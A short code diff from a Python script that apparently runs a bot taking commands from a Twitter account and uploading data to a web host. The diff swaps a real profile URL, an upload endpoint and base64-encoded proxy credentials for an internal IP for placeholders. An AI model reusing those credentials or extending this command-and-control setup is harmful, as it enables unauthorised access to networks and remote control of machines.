@@ -16,13 +16,12 @@ from uuid import getnode as get_mac
 import json
 
 
-twitterUrl = "https://twitter.com/Animesh77277278"
-uploadURL = 'https://monohydric-variatio.000webhostapp.com/upload.php'
+twitterUrl = "<twitter url>"
+uploadURL = '<my website url>/upload.php'
 tweetNumberFromTopRecent = 0  # the topmost tweet
 identification = {}
 botname = ''
-proxyDict = {'http': "http://username:pasword@proxyserver:proxyport"}
-proxy = {'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"}
+proxy = os.environ['HTTP_PROXY']
 
 
 def commandFromTwitter():
